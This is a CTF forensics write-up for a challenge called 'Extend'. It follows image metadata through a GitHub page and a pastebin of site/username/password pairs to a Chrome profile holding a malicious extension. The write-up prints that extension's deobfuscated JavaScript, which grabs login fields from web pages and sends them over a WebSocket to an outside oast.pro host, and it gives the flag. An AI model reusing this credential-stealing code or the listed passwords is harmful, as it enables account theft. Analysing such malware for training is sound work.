![date](https://img.shields.io/badge/date-09.10.2023-brightgreen.svg)  
![solved](https://img.shields.io/badge/solved-After%20the%20CTF-red.svg)   
![category](https://img.shields.io/badge/category-Forensics-blueviolet.svg)   
![value](https://img.shields.io/badge/value-300-blue.svg)
## Description
Is this a normal image??
## Challenge Files
- [chall.jpg](chall.jpg)

## Solution
Using exiftool, we get the image metadata. We find this [link](https://justuser-tmpusage.github.io/BHatCtf.github.io/) in the comment of the image.
Following it leads us to this page.
![](attachments/Pasted%20image%2020231011224857.png)
As we can see, we need more data. The link `justuser-tmpusage.github.io/BHatCtf.github.io/` is made available through github pages for a user called "justuser-tmpusage". Going through this user's github profile, we find this markdown file.

![](attachments/Pasted%20image%2020231011225034.png)
This leads us to a pastebin with the following content:
```
https://www.bankofamerica.com/ : Jacksmp : bukq8rS3TQj9hK!e(DELC4XnA5U#*G7V

https://www.facebook.com/ : Jacksmp : pmbYBIUC+We^%PgKNcH3*sQh9#AZD4$r

https://www.twitter.com/ : Jacksmp : LSBn+@bCQqPa2g6#*HjsmFpdrG8^7AWE

https://www.LinkedIn.com/ : Jacksmp : JM4xpgQ%6^NB2$3XHLukwRvSA*5b!D7)

https://www.Instagram.com/ : Jacksmp : Jp24A*@va&s5dc#nN^L$gmeGxFTbQEVH

https://mega.nz/file/1V0hQAzA : HxzUmwVKEdQqUmWSkm3kptBbv6aYUn6TKD9ViXW6XiQ
```
Through the mega link we get `Chrome.7z`. This is the directory of a user.
Going through the files and information of the user, we find nothing. However, looking at the name of the challenge "Extend", we can guess that it has something to do with extensions.
Inside the extensions folder, we find an extension called Blackhat DFIR, that contains an obfuscated js script.
Upon deobfuscating it, we get the this result:
```javascript
function disconnect() {
  if (webSocket) {
    webSocket.close()
  }
}
function keepAlive() {
  const interval = setInterval(() => {
    if (webSocket) {
      console.log('ping')
      webSocket.send('ping')
    } else {
      clearInterval(interval)
    }
  }, TEN_SECONDS_MS)
}
function domag() {
  var email = document.getElementsByName('email')
  var phone = document.getElementsByName('phone')
  var username = document.getElementsByName('username')
  var password = document.getElementsByName('password')
  if ((email || phone || username) && password) {
    console.log(document.location.host)
    while (true) {
      if (email) {
        connect(password, email, document.location.host)
      } else {
        if (phone) {
          connect(password, phone, document.location.host)
        } else {
          connect(password, username, document.location.host)
        }
      }
      keepAlive()
    }
  } else {
    console.log('Email not Found')
  }
}
chrome.action.onClicked.addListener((event) => {
  if (!event.url.includes('chrome://')) {
    chrome.scripting.executeScript({
      target: { tabId: event.id },
      function: domag,
    })
  }
})
function connect(
  part_3 = 'WYwIjYzMTM2sXWHFETGhkQ',
  part_2 = '1QjY0YGNxEDM1cTMxQ2YjV',
  part_1 = 'Qf2MjYwAzNyIDOjVTZkJTY'
) {
  scostr = part_1 + '---' + part_2 + '---' + part_3
  webSocket = new WebSocket('wss://' + scostr + '.oast.pro/')
  webSocket.onopen = (ws) => {
    chrome.action.setIcon({ path: 'icons/socket-active.png' })
  }
  webSocket.onmessage = (message) => {
    console.log(message.data)
  }
  webSocket.onclose = (ws) => {
    chrome.action.setIcon({ path: 'icons/socket-inactive.png' })
    console.log('websocket connection closed')
    webSocket = null
  }
}
```

The suspicious part here is the `connect` function, which has "base64" in it. The solution is that we need to reverse those base64 encoded strings.
![](attachments/Pasted%20image%2020231011225620.png)

## Flag
BHFLAGY{6133b20aeccd11750114f4b45a2de5c822700b36}